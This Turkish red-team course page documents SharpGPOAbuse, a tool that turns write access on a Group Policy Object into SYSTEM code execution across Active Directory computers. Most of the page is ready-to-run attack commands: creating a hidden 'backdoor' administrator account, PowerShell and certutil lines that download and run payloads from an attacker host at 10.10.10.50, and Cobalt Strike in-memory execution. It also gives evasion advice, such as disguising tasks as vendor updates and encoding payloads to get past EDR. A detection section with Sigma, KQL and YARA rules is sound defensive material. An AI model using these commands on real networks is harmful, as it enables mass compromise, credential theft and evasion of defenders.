# SharpGPOAbuse

> **Kategori:** [9. ACL, GPO ve Nesne Manipülasyonu](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** F-Secure LABS tarafından geliştirilen; saldırganın düzenleme yetkisine (`WriteProperty`, `GenericWrite`, `GenericAll`, `WriteDacl`) sahip olduğu bir Grup İlkesi Nesnesini (GPO) hedef alarak, etki alanındaki tüm bağlı bilgisayarlara anlık zamanlanmış görev (Immediate Scheduled Task), yerel yönetici (Local Admin) veya kullanıcı hakları enjekte eden C# tabanlı sömürü aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamlarında sistem yöneticileri, binlerce iş istasyonu ve sunucunun yapılandırmasını merkezi olarak yönetmek için **Grup İlkesi Nesneleri (GPO - Group Policy Objects)** kullanır. Bir GPO mimari olarak iki temel bileşenden oluşur:
1. **Grup İlkesi Kapsayıcısı (GPC - Group Policy Container):** Active Directory LDAP veri tabanında `CN=Policies,CN=System,DC=domain,DC=local` altında saklanır. GPO'nun sürüm numarasını (`versionNumber`), görünen adını ve İstemci Tarafı Uzantı (CSE - Client Side Extension) GUID değerlerini barındırır.
2. **Grup İlkesi Şablonu (GPT - Group Policy Template):** Etki alanı denetleyicilerinin paylaşılan dosya sisteminde (`\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\{GUID}\`) saklanır. İlkeye ait gerçek yapılandırma dosyalarını (`gpt.ini`), zamanlanmış görev XML'lerini (`ScheduledTasks.xml`), güvenlik şablonlarını (`GptTmpl.inf`) ve betikleri barındırır.

Güvenlik denetimlerinde veya BloodHound analizlerinde, genellikle zayıf yetkilendirilmiş kullanıcıların veya yardım masası hesaplarının belirli GPO nesneleri üzerinde `WriteProperty`, `GenericWrite`, `GenericAll` veya `WriteDacl` izinlerine sahip olduğu görülür.

**`SharpGPOAbuse`**, bir GPO üzerindeki yazma hakkını etki alanı genelinde uzaktan kod yürütmeye ve yerel yönetici haklarına dönüştüren bir C# (.NET) aracıdır. Doğrudan etki alanı denetleyicisine kod enjekte etmez veya hedef uç noktalara doğrudan SMB bağlantısı kurmaz. Bunun yerine meşru Grup İlkesi dağıtım mekanizmasını silah haline getirir:
- SYSVOL üzerindeki GPT dosyalarına kötü niyetli bir görev veya yerel yönetici yapılandırması yazar.
- LDAP üzerindeki GPC nesnesinin `versionNumber` özniteliğini ve CSE uzantılarını günceller.
- İlgili GPO'nun bağlı olduğu OU (Organizational Unit) altındaki tüm bilgisayarlar, periyodik ilke yenileme döngüsünde (varsayılan 90 dakika + rastgele 30 dakika) veya sistem yeniden başlatıldığında yeni ilkeyi SYSVOL'den indirir ve saldırganın komutunu **`NT AUTHORITY\SYSTEM`** yetkileriyle çalıştırır!

### Temel Çalışma Mekanizması

1. **GPO Hedefleme:** GPO'nun adı (`--GpoName`) veya GUID kimliği (`--GpoId`) ile hedef belirlenir.
2. **SYSVOL GPT Manipülasyonu:**
   - **Immediate Task (Anlık Zamanlanmış Görev):** `Machine\Preferences\ScheduledTasks\ScheduledTasks.xml` dosyası oluşturulur veya güncellenir. Bu görev, ilke işlendiği anda hiçbir bekleme yapmadan derhal (`TaskType: Immediate`) `SYSTEM` yetkisiyle tetiklenir.
   - **Local Admin Enjeksiyonu:** `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` dosyası düzenlenerek hedef kullanıcı `Administrators` grubuna üye yapılır.
   - **User Rights Assignment:** `SeDebugPrivilege` veya `SeImpersonatePrivilege` hakları atanır.
3. **Versiyon Senkronizasyonu (GPC & GPT):**
   - SYSVOL içindeki `gpt.ini` dosyasında kullanıcı ve makine sürüm sayaçları artırılır.
   - LDAP üzerinden DC'deki GPC nesnesine bağlanılır; `versionNumber` özniteliği eşitlenir ve İstemci Tarafı Uzantı GUID'i (`gPCMachineExtensionNames`) eklenir.
4. **İstemci Tarafı Yürütme:** Uç noktalar ilke sürümünün arttığını fark eder, CSE uzantısını tetikler ve yükü çalıştırır.

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│               SALDIRGAN İŞ İSTASYONU (C# / IN-MEMORY EXECUTION)        │
│                                                                        │
│  [ SharpGPOAbuse.exe --AddComputerTask --TaskName "HealthCheck"        │
│                      --Command "cmd.exe" --Arguments "/c net user..."  │
│                      --GpoName "Default Workstation Policy" ]          │
│         │                                                              │
│         ├── (1) SYSVOL Paylaşımına SMB (TCP 445) ile Yazılır:          │
│         │       \\corp.local\SYSVOL\Policies\{GUID}\Machine\...        │
│         │       └── ScheduledTasks.xml (SYSTEM Yetkili Anlık Görev)    │
│         │       └── gpt.ini (Versiyon Sayacı Artırılır)                │
│         │                                                              │
│         ├── (2) LDAP (TCP 389/636) ile GPC Nesnesi Güncellenir:        │
│         │       CN={GUID},CN=Policies,CN=System,DC=corp,DC=local       │
│         │       └── versionNumber Güncellenir, CSE GUID Eklenir        │
│         │                                                              │
│         ▼                                                              │
│  [ KURUMSAL ETKİ ALANI DENETLEYİCİSİ (SYSVOL + LDAP GÜNCELLENDİ) ]     │
│         │                                                              │
│         │ (Normal İlke Yenileme veya gpupdate /force Tetiklemesi)      │
│         ▼                                                              │
│  [ HEDEF BİLGİSAYARLAR / SUNUCULAR (OU ALTINDAKİ TÜM WORKSTATION'LAR) ]│
│         │                                                              │
│         ├── Group Policy Servisi Yeni Sürümü Algılar ve İndirir        │
│         ├── Task Scheduler Servisi XML'i Ayrıştırır                    │
│         └── Görevi Derhal Yürütür: NT AUTHORITY\SYSTEM                 │
│                   │                                                    │
│                   ▼                                                    │
│  [ ÇIKTI: 500+ Bilgisayarda Aynı Anda Yerel Yönetici Yetkisi Alındı! ] │
└────────────────────────────────────────────────────────────────────────┘
```

### Neden Önemli? Operasyonel Değer

| Operasyonel Kriter | Klasik Yanal Hareket (WMI / PsExec) | GPO Manipülasyonu (SharpGPOAbuse) |
|---|---|---|
| **Erişim Kapsamı** | Her hedef makineye tek tek bağlanmak gerekir (1-e-1). | Tek bir GPO değişikliğiyle yüzlerce/binlerce makineye aynı anda yayılır (1-e-N). |
| **Ağ Güvenlik Duvarı** | Hedef makinelerin 445 veya 135 portlarının açık olması şarttır. | Hedef makinelerin hiçbir gelen (inbound) portuna ihtiyaç duyulmaz. Makineler ilkeyi kendileri çeker. |
| **Yetki Düzeyi** | Hedef makinede önceden yerel yönetici olmak zorunludur. | Hedefte hiçbir hakka sahip olunmasa bile doğrudan `SYSTEM` yetkisi elde edilir. |
| **C2 Entegrasyonu** | Harici Python scriptleri veya binary yüklemeleri gerekir. | Saf C# yapısıyla Cobalt Strike / Sliver üzerinden `execute-assembly` ile bellekte çalışır. |

### Alternatif Araçlarla Karşılaştırma

| Özellik | SharpGPOAbuse | pyGPOAbuse | StandIn | PowerShell (New-GPO) |
|---|---|---|---|---|
| **Geliştirme Dili** | C# (.NET) | Python 3 | C# (.NET) | PowerShell |
| **Çalışma Platformu** | Windows (Yerel / In-Memory) | Linux / macOS | Windows | Windows (RSAT) |
| **C2 Execute-Assembly** | 🟢 Mükemmel | 🔴 Desteklemez | 🟢 Desteklemez | 🟡 Script Block Logging |
| **Immediate Task Desteği**| 🟢 Var (Tam Otomatik) | 🟢 Var | 🔴 Kısıtlı | 🔴 Karmaşık XML şablonu |
| **Local Admin Ekleme** | 🟢 Var (`--AddLocalAdmin`) | 🟡 Betik ile | 🔴 Yok | 🟡 Restricted Groups |
| **SYSVOL SMB Desteği** | 🟢 Yerleşik .NET I/O | 🟢 Impacket SMB | 🟢 Win32 API | 🟢 Windows SMB |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

SharpGPOAbuse, yürütülmek istenen manipülasyon türüne göre ana eylem bayrakları ve bunlara bağlı argümanlar alır.

### Genel Sözdizimi

```cmd
SharpGPOAbuse.exe <Eylem Türü> [Görev / Kullanıcı Parametreleri] --GpoName "<GPO_Adı>" [Seçenekler]
```

### Desteklenen Kritik Bayraklar ve Parametreler

| Parametre / Bayrak | Açıklama | Örnek Kullanım |
|---|---|---|
| `--AddComputerTask` | Bilgisayar yapılandırmasına (Computer Configuration) anlık zamanlanmış görev ekler (`NT AUTHORITY\SYSTEM` olarak çalışır). | `--AddComputerTask` |
| `--AddUserTask` | Kullanıcı yapılandırmasına (User Configuration) zamanlanmış görev ekler (Oturum açan kullanıcı bağlamında çalışır). | `--AddUserTask` |
| `--AddLocalAdmin` | Belirtilen kullanıcıyı hedef makinelerdeki yerel `Administrators` grubuna ekler (Restricted Groups). | `--AddLocalAdmin --UserAccount jdoe` |
| `--AddUserRights` | Belirtilen kullanıcıya özel kullanıcı hakları atar (Örn: `SeDebugPrivilege`). | `--AddUserRights --UserRights SeDebugPrivilege` |
| `--TaskName` | Oluşturulacak zamanlanmış görevin adı (Gizleme amaçlı meşru isimler verilmelidir). | `--TaskName "GoogleUpdateTask"` |
| `--Author` | Zamanlanmış görev yazar (Author) meta verisi (Varsayılan: `Microsoft`). | `--Author "SYSTEM"` |
| `--Command` | Çalıştırılacak program veya ikili dosya yolu. | `--Command "cmd.exe"` |
| `--Arguments` | Çalıştırılacak komuta iletilecek argümanlar dizisi. | `--Arguments "/c powershell -enc ..."` |
| `--GpoName` | Saldırılacak hedef GPO'nun Görünen Adı (Display Name). | `--GpoName "Workstations-Baseline"` |
| `--GpoId` | GPO'nun benzersiz GUID kimliği (`--GpoName` yerine kullanılabilir). | `--GpoId "{31B2F340-016D-11D2-945F-00C04FB984F9}"` |
| `--DomainController` | İşlemlerin yürütüleceği hedef Domain Controller FQDN veya IP adresi. | `--DomainController dc01.corp.local` |
| `--Domain` | Hedef Active Directory etki alanı adı. | `--Domain corp.local` |
| `--Force` | Mevcut görev veya ilke dosyalarının üzerine zorla yazılmasını sağlar. | `--Force` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: GPO Üzerinden Anlık Zamanlanmış Görev Enjeksiyonu (Immediate Task as SYSTEM)

Düzenleme yetkisi bulunan `General-Workstations` ilkesine anında çalışacak bir komut enjekte ederek hedef makinelerde yeni bir yerel yönetici oluşturmak:

```cmd
SharpGPOAbuse.exe --AddComputerTask --TaskName "WindowsDefenderMaintenance" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c net user backdoor Pass123! /add && net localgroup administrators backdoor /add" --GpoName "General-Workstations"
```

**Örnek Konsol Çıktısı Analizi:**

```text
C:\Tools> SharpGPOAbuse.exe --AddComputerTask --TaskName "WindowsDefenderMaintenance" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c net user backdoor Pass123! /add && net localgroup administrators backdoor /add" --GpoName "General-Workstations"

[*] SharpGPOAbuse v1.0 - Group Policy Abuse Tool
[*] Domain Controller: dc01.corp.local
[*] Domain: corp.local

[*] Resolving GPO 'General-Workstations'...
[+] Found GPO: CN={4A8912A0-912F-4310-9281-72BA01928471},CN=Policies,CN=System,DC=corp,DC=local
[*] GPO GUID: {4A8912A0-912F-4310-9281-72BA01928471}
[*] Current GPO Version (LDAP): 14
[*] Current GPO Version (SYSVOL): 14

[*] Checking write permissions on SYSVOL GPT...
[+] Write permissions confirmed on: \\corp.local\SYSVOL\corp.local\Policies\{4A8912A0-912F-4310-9281-72BA01928471}\

[*] Constructing ScheduledTasks.xml with Immediate Task...
[+] Scheduled task configuration generated successfully!
[*] Writing ScheduledTasks.xml to SYSVOL...
[+] File successfully written to: \\corp.local\SYSVOL\corp.local\Policies\{4A8912A0-912F-4310-9281-72BA01928471}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml

[*] Incrementing version number in gpt.ini...
[+] SYSVOL version updated: 15 (Machine: 1, User: 0)

[*] Updating GPC object via LDAP...
[*] Adding Scheduled Tasks CSE GUID to gPCMachineExtensionNames...
[*] Setting versionNumber to 15...
[+] GPC LDAP object successfully updated!

[+] GPO abuse completed successfully!
[*] Target computers will execute the task upon their next group policy refresh.
```

*Çıktı Yorumu:* SharpGPOAbuse, hem SYSVOL dosyasını yazmış hem de LDAP nesnesinin versiyonunu 14'ten 15'e çıkararak CSE kancasını başarıyla yerleştirmiştir. İlke yenilendiğinde görev tüm makinelerde `SYSTEM` olarak çalışacaktır.

### Senaryo 2: Etki Alanı Genelinde Yerel Yönetici Ekleme (Restricted Groups)

GPO'nun uygulandığı tüm bilgisayarlarda mevcut domain kullanıcısını (`CORP\jdoe`) doğrudan yerel `Administrators` grubuna eklemek:

```cmd
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount jdoe --GpoName "Workstations-Baseline"
```

Bu komut, GPT altındaki `GptTmpl.inf` güvenlik şablonunu düzenleyerek `[Group Membership]` bölümüne `jdoe` hesabını ekler.

### Senaryo 3: Hedef Kullanıcıya SeDebugPrivilege ve SeImpersonatePrivilege Hakkı Verme

Yetki yükseltme (LPE / Potato saldırıları) yapabilmek amacıyla standart bir servis hesabına kritik Windows ayrıcalıklarını tanımlamak:

```cmd
SharpGPOAbuse.exe --AddUserRights --UserAccount svc_app --UserRights "SeDebugPrivilege,SeImpersonatePrivilege" --GpoName "Servers-Security-Policy"
```

### Senaryo 4: Cobalt Strike Beacon / Tersine Kabuk Yayma

Tüm sunuculardan saldırgan C2 sunucusuna `SYSTEM` yetkisiyle tersine kabuk (Reverse Shell) başlatmak:

```cmd
SharpGPOAbuse.exe --AddComputerTask --TaskName "TelemetryReport" --Command "powershell.exe" --Arguments "-nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.50/beacon.ps1')\"" --GpoName "Domain-Servers-Policy"
```

### Senaryo 5: GPO Güncellemesini Hedef Sistemlerde Hızlandırma

Normal şartlarda GPO yenilenmesi için 90 dakika beklemek gerekir. Ancak operatörün ağda WMI veya WinRM erişimi varsa bu süreci hızlandırabilir:

```powershell
# PowerShell üzerinden uzak makinede ilke yenilemeyi tetikle
Invoke-Command -ComputerName target-pc -ScriptBlock { gpupdate /force }
```

### Senaryo 6: C2 Çerçevesi Bellek İçi Yürütme (Cobalt Strike / Sliver)

Diske `.exe` yüklemeksizin Cobalt Strike Beacon üzerinden `execute-assembly` ile doğrudan bellekten yürütme:

```text
beacon> execute-assembly /opt/tools/SharpGPOAbuse.exe --AddComputerTask --TaskName "AppServiceUpdate" --Command "cmd.exe" --Arguments "/c net user tempadmin Password123! /add && net localgroup administrators tempadmin /add" --GpoName "Staff-Computers"
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Kod | Temel Neden | Kesin Çözüm Adımı |
|---|---|---|
| `UnauthorizedAccessException: Access to the path '\\domain\sysvol\...' is denied` | Kullanıcının Active Directory LDAP üzerindeki GPC nesnesinde yazma hakkı vardır ancak SYSVOL dosya paylaşımındaki (NTFS) GPT klasöründe yazma yetkisi bulunmamaktadır. | GPC ve GPT izinleri bazen eşleşmeyebilir. Operatörün SYSVOL üzerindeki NTFS izinleri denetlenmeli; eğer yazma hakkı yoksa yalnızca LDAP manipülasyonlarına odaklanılmalıdır. |
| `GPO Version mismatch / Clients ignore payload` | `gpt.ini` dosyasındaki sürüm numarası ile LDAP `versionNumber` özniteliği uyuşmamaktadır veya sürüm artırılmamıştır. | `--Force` bayrağı ile komut tekrar çalıştırılmalı; gerekirse `gpt.ini` ve LDAP nesnesindeki sürüm sayaçları elle doğrulanmalıdır. |
| `CSE GUID missing / Scheduled task does not appear on clients` | LDAP üzerindeki `gPCMachineExtensionNames` özniteliğine Zamanlanmış Görevler CSE GUID'i (`{CAB54552-DE03-11D1-AC36-00C04FB873F9}`) başarıyla yazılamamıştır. | Kullanıcının GPC nesnesi üzerinde `WriteProperty` yetkisi teyit edilmeli; eksikse [bloodyAD](./bloodyAD.md) ile `gPCMachineExtensionNames` özniteliği manuel eklenmelidir. |
| `Task runs once but never again` | `Immediate Task` mimari olarak tek seferlik çalışacak şekilde tasarlanmıştır; ikinci kez tetiklenmez. | Görevin periyodik olarak çalışması gerekiyorsa XML içinde günlük veya saatlik tetikleyici (`TimeTrigger`) tanımlanmalı veya yeni bir ilke sürümü basılmalıdır. |
| `Kerberos pre-authentication failed on SYSVOL access` | SMB bağlantısı kurulurken Kerberos bilet saati ile DC saati arasında uyumsuzluk (skew) vardır veya SMB imzalaması zorunludur. | Sistem saati DC ile eşitlenmeli ve `--DomainController` bayrağına IP yerine tam FQDN verilmelidir. |
| `Antivirus / EDR blocks ScheduledTasks.xml creation` | Uç nokta veya DC üzerindeki güvenlik yazılımı, SYSVOL altına yazılan şüpheli komut satırlarını (`cmd.exe /c net user`) tespit etmiştir. | Komut satırı argümanları Base64 kodlanmalı veya meşru bir Windows sistem ikilisi (LOLBin - `certutil`, `bitsadmin`, `msiexec`) taklit edilmelidir. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
┌────────────────────────────────────────────────────────────────────────┐
│                        GÜRÜLTÜ VE İZ SEVİYESİ                          │
│                                                                        │
│  [ Ağ Portları ]     : 🟡 ORTA (SMB TCP 445 + LDAP TCP 389/636)        │
│  [ SYSVOL Dosya İzi ]: 🔴 YÜKSEK (Event 5145 Dosya Yazma Olayı)        │
│  [ Dizin Günlüğü ]   : 🔴 YÜKSEK (Event 5136 GPC Nesne Modifikasyonu) │
│  [ Uç Nokta İzi ]    : 🔴 YÜKSEK (Event 4698 Zamanlanmış Görev İcadı)  │
└────────────────────────────────────────────────────────────────────────┘
```

### 5.1 Bırakılan İzler (Artifacts & Telemetry)

1. **Domain Controller Dosya Paylaşım Günlükleri (Security Log):**
   - **Event ID 5145 (A network share object was accessed):**
     - `ShareName: \\*\SYSVOL`
     - `RelativeTargetName: Policies\{GUID}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml`
     - `AccessMask: 0x2 (WriteData)` veya `0x100 (WriteAttributes)`.
2. **Dizin Hizmeti Değişiklik Günlükleri:**
   - **Event ID 5136 (Directory Service Object Modified):**
     - GPC nesnesinde `AttributeLDAPDisplayName: versionNumber` ve `gPCMachineExtensionNames` değerlerinin değiştirilmesi.
3. **Uç Nokta Olay Günlükleri (Tüm İstemcilerde):**
   - **Event ID 4698 (A scheduled task was created):** İstemci makinede `Microsoft-Windows-TaskScheduler/Operational` altında görevin oluşturulduğu an kaydedilir.
   - **Sysmon Event ID 1 (Process Create):** `TaskEng.exe` veya `svchost.exe` tarafından tetiklenen `cmd.exe /c net user ...` gibi alt süreçler.

### 5.2 Ağ ve EDR İmzaları

- **SYSVOL İmzası:** SYSVOL paylaşımında `ScheduledTasks.xml` veya `GptTmpl.inf` dosyalarının Domain Admin olmayan standart bir kullanıcı hesabı tarafından güncellenmesi EDR ve SIEM dosya izleme kurallarının en temel tespit mantığıdır.
- **Toplu Süreç Başlatma:** İlke saati geldiğinde yüzlerce makinenin aynı saniye içinde aynı komut satırını çalıştırması ağ genelinde devasa bir davranışsal anomali üretir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araç İçindeki Kullanım |
|---|---|---|
| **T1484.001** | Domain Policy Modification: Group Policy Modification | GPO şablonlarının ve dizin nesnelerinin kötüye kullanılması. |
| **T1053.005** | Scheduled Task/Job: Scheduled Task | İstemcilerde SYSTEM yetkili zamanlanmış görev oluşturulması. |
| **T1078.002** | Valid Accounts: Domain Accounts | Meşru kullanıcı hakları ve grup üyelikleriyle sistemlere erişim. |
| **T1098** | Account Manipulation | Yerel yöneticiler grubuna kullanıcı eklenmesi. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Pratiği |
|---|---|
| **Toplu Alarm Patlaması** | Çok geniş kapsamlı (Örn: `Default Domain Policy`) GPO'ları hedeflemeyin; binlerce makinede aynı anda alarm tetiklenir. Yalnızca hedeflenen sunucuların bulunduğu küçük OU ilkelerini seçin. |
| **Görev Adı Gizleme** | `--TaskName` bayrağına dikkat çekici isimler vermek yerine `MicrosoftEdgeUpdateTaskMachineUA` veya `OneDrive Standalone Update Task` gibi meşru isimler verin. |
| **SYSVOL Temizliği** | Sızma testi tamamlandığında veya kalıcılık sağlandığında oluşturulan `ScheduledTasks.xml` dosyası SYSVOL'den silinmeli ve ilke versiyonu temizlenmelidir. |
| **Komut Satırı Gizleme** | Komut satırında doğrudan `net user` veya şüpheli PowerShell dizgileri çalıştırmayın; meşru bir ikiliyi DLL Hijacking ile tetikleyin veya kodlanmış yükler kullanın. |

### 5.5 Savunma Karşılığı: Tespit Kuralları

#### Sigma Kuralı: SYSVOL İçinde Şüpheli ScheduledTasks.xml Modifikasyonu Tespiti

```yaml
title: GPO Scheduled Task Modification in SYSVOL
id: d91238a1-4812-4c20-a912-48910245fe01
status: experimental
description: Detects write operations to GPO ScheduledTasks.xml files in the SYSVOL share, indicative of SharpGPOAbuse or pyGPOAbuse.
author: Modul 11 Security Research
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5145
    ShareName|endswith: '\SYSVOL'
    RelativeTargetName|contains: 'ScheduledTasks\ScheduledTasks.xml'
    AccessMask: '0x2' # WriteData
  filter_admins:
    SubjectUserName|endswith: '$' # Makine hesapları veya meşru domain adminler filtrelenebilir
  condition: selection and not filter_admins
falsepositives:
  - Legitimate GPO management by authorized Group Policy Administrators via GPMC
level: critical
tags:
  - attack.privilege_escalation
  - attack.t1484.001
```

#### Microsoft Sentinel KQL Sorgusu: GPC Nesne Değişikliği ve Eşzamanlı SYSVOL Yazımı

```kql
// 5 dakika içinde hem GPC nesnesi değiştirilen hem de SYSVOL altına ScheduledTasks.xml yazılan olaylar
let SysvolWrites = SecurityEvent
| where TimeGenerated > ago(1h)
| where EventID == 5145 and ShareName has "SYSVOL" and RelativeTargetName has "ScheduledTasks.xml"
| project WriteTime = TimeGenerated, SubjectUserName, RelativeTargetName, IpAddress;
let GpcModifications = SecurityEvent
| where TimeGenerated > ago(1h)
| where EventID == 5136 and ObjectDN has "CN=Policies,CN=System"
| project ModTime = TimeGenerated, SubjectUserName, ObjectDN, AttributeLDAPDisplayName;
SysvolWrites
| join kind=inner (GpcModifications) on SubjectUserName
| where ModTime between (WriteTime - 5m .. WriteTime + 5m)
| project WriteTime, ModTime, SubjectUserName, RelativeTargetName, ObjectDN, IpAddress
```

#### YARA Kuralı: SharpGPOAbuse Binary ve Metot İmzaları

```yara
rule PostExploit_SharpGPOAbuse_Assembly {
    meta:
        description = "Detects compiled SharpGPOAbuse .NET assembly and task manipulation strings"
        author = "Active Directory Red Team Module 11"
        date = "2026-10-14"
        severity = "Critical"
    strings:
        $s1 = "SharpGPOAbuse" ascii wide
        $s2 = "--AddComputerTask" ascii wide
        $s3 = "--AddLocalAdmin" ascii wide
        $s4 = "ScheduledTasks.xml" ascii wide
        $s5 = "gPCMachineExtensionNames" ascii wide
        $s6 = "CAB54552-DE03-11D1-AC36-00C04FB873F9" ascii wide
    condition:
        uint16(0) == 0x5A4D and (
            3 of ($s1, $s2, $s3, $s4, $s5, $s6)
        )
}
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: GPO ile Tüm Bilgisayarlarda SYSTEM Olarak Anlık Görev Çalıştırma
```cmd
SharpGPOAbuse.exe --AddComputerTask --TaskName "SecUpdate" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c whoami > C:\pwned.txt" --GpoName "Workstations-Policy"
```
- **Ne Yapar?** İlkeye bağlı tüm bilgisayarlarda ilke yenilenir yenilenmez `SYSTEM` yetkisiyle belirtilen komutu çalıştırır.
- **Ne Zaman Kullanılır?** GPO yazma hakkı üzerinden etki alanı genelinde toplu kod yürütmek için.
- **Parametreler:** `--AddComputerTask`: Makine görevi, `--Command`: İkili yol, `--Arguments`: Komut argümanları.

### Komut 2: Hedef Kullanıcıyı Tüm Makinelerde Yerel Yönetici Yapma
```cmd
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount jdoe --GpoName "General-Workstations"
```
- **Ne Yapar?** `jdoe` kullanıcısını GPO'nun bağlı olduğu tüm bilgisayarlarda yerel `Administrators` grubuna ekler.
- **Ne Zaman Kullanılır?** Doğrudan Domain Admin olunamasa bile yüzlerce hedef makinede tam yerel hak elde etmek için.
- **Parametreler:** `--AddLocalAdmin`: Yerel yönetici ekleme, `--UserAccount`: Hedef kullanıcı adı.

### Komut 3: Kullanıcı Yapılandırmasında Görev Tanımlama (User Task)
```cmd
SharpGPOAbuse.exe --AddUserTask --TaskName "UserSync" --Command "powershell.exe" --Arguments "-enc <Base64Payload>" --GpoName "Staff-Users-Policy"
```
- **Ne Yapar?** Kullanıcı ilkesine görev ekler; hedef kullanıcılar bilgisayarlarına giriş yaptıklarında komut çalışır.
- **Ne Zaman Kullanılır?** Kullanıcı oturumu içinde veri hasadı veya kullanıcı bağlamında token yakalamak için.
- **Parametreler:** `--AddUserTask`: Kullanıcı bağlamında görev oluşturma.

### Komut 4: Hedef Kullanıcıya SeDebugPrivilege Hakkı Tanımlama
```cmd
SharpGPOAbuse.exe --AddUserRights --UserAccount svc_sql --UserRights "SeDebugPrivilege" --GpoName "Database-Servers-Policy"
```
- **Ne Yapar?** Hedef kullanıcının işletim sistemindeki diğer süreçlerin belleğini okuyabilmesini (`SeDebugPrivilege`) sağlar.
- **Ne Zaman Kullanılır?** LSASS bellek dökümü almak için ön gereksinim olan ayrıcalığı sağlamak istendiğinde.
- **Parametreler:** `--AddUserRights`: Kullanıcı hakkı atama.

### Komut 5: GPO GUID Değeri Belirterek Doğrudan Hedefleme
```cmd
SharpGPOAbuse.exe --AddComputerTask --TaskName "AuditCheck" --Command "cmd.exe" --Arguments "/c certutil -urlcache -split -f http://10.10.10.50/a.exe C:\a.exe && C:\a.exe" --GpoId "{31B2F340-016D-11D2-945F-00C04FB984F9}"
```
- **Ne Yapar?** GPO adını bilmeye gerek kalmadan doğrudan bilinen GUID kimliği üzerinden enjeksiyon yapar.
- **Ne Zaman Kullanılır?** GPO adı karmaşık veya özel karakterler içerdiğinde kesin GUID ile işlem yapmak için.
- **Parametreler:** `--GpoId`: Hedef GPO GUID değeri.

### Komut 6: Mevcut Görevin Üzerine Zorla Yazma (Overwrite)
```cmd
SharpGPOAbuse.exe --AddComputerTask --TaskName "SecUpdate" --Command "calc.exe" --GpoName "Workstations-Policy" --Force
```
- **Ne Yapar?** Belirtilen görev adı önceden varsa hata vermeden üzerine yazar ve ilke sürümünü günceller.
- **Ne Zaman Kullanılır?** Daha önce enjekte edilmiş bir görevin yükünü değiştirmek gerektiğinde.
- **Parametreler:** `--Force`: Üzerine yazmayı zorlar.

### Komut 7: Belirli Bir Domain Controller Hedefleme
```cmd
SharpGPOAbuse.exe --AddComputerTask --TaskName "DiagnosticTask" --Command "cmd.exe" --Arguments "/c whoami" --GpoName "Servers-Policy" --DomainController "dc02.corp.local"
```
- **Ne Yapar?** LDAP ve SYSVOL operasyonlarını birincil DC yerine belirtilen ikincil DC üzerinden yürütür.
- **Ne Zaman Kullanılır?** Birincil DC yoğun izleniyorsa veya replikasyon gecikmesi test ediliyorsa.
- **Parametreler:** `--DomainController`: Hedef DC FQDN'i.

### Komut 8: Çoklu Ayrıcalık (Privilege) Ataması
```cmd
SharpGPOAbuse.exe --AddUserRights --UserAccount jdoe --UserRights "SeImpersonatePrivilege,SeTcbPrivilege,SeBackupPrivilege" --GpoName "Core-Policy"
```
- **Ne Yapar?** Kullanıcıya hem token taklidi (`SeImpersonate`), hem işletim sistemi parçası olma (`SeTcb`), hem de dosya yedekleme (`SeBackup`) yetkisi verir.
- **Ne Zaman Kullanılır?** Potato saldırıları veya NTDS.dit dosyasını yedekleme ayrıcalığıyla çalmak için.
- **Parametreler:** Virgülle ayrılmış ayrıcalık listesi.

### Komut 9: Cobalt Strike execute-assembly ile Sessiz Çalıştırma
```text
beacon> execute-assembly SharpGPOAbuse.exe --AddComputerTask --TaskName "GoogleUpdateTaskMachineQC" --Author "Google LLC" --Command "C:\Windows\System32\cmd.exe" --Arguments "/c powershell.exe -w hidden -enc ..." --GpoName "Corporate-Laptops"
```
- **Ne Yapar?** C2 konsolundan diske dosya yazmadan doğrudan bellekte GPO saldırısını icra eder.
- **Ne Zaman Kullanılır?** Red team operasyonlarında EDR dosya tarayıcılarından kaçınmak için.
- **Parametreler:** Meşru yazılım başlıkları taklit edilmiştir.

### Komut 10: Uzak İstemcide İlke Yenilemesini Tetikleme (PowerShell)
```powershell
Invoke-GPUpdate -Computer "TARGET-WORKSTATION" -RandomDelayInMinutes 0 -Force
```
- **Ne Yapar?** Hedef bilgisayara derhal ilke güncellemesi (`gpupdate /force`) komutu gönderir.
- **Ne Zaman Kullanılır?** 90 dakikalık normal ilke yenilenme süresini beklemek istemediğimizde.
- **Parametreler:** `-RandomDelayInMinutes 0`: Bekleme süresini sıfırlar.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [FSecureLABS / SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)
- **F-Secure Araştırma Blogu:** [GPO Abuse: Operational Guidance and Tooling](https://labs.f-secure.com/)
- **SpecterOps GPO Araştırması:** [Abusing Group Policy Objects](https://posts.specterops.io/)
- **MITRE ATT&CK Referansı:** [T1484.001 - Group Policy Modification](https://attack.mitre.org/techniques/T1484/001/)

---

> **Önceki:** [← aclpwn](./aclpwn.md) · **Sonraki:** [pyGPOAbuse →](./pyGPOAbuse.md)
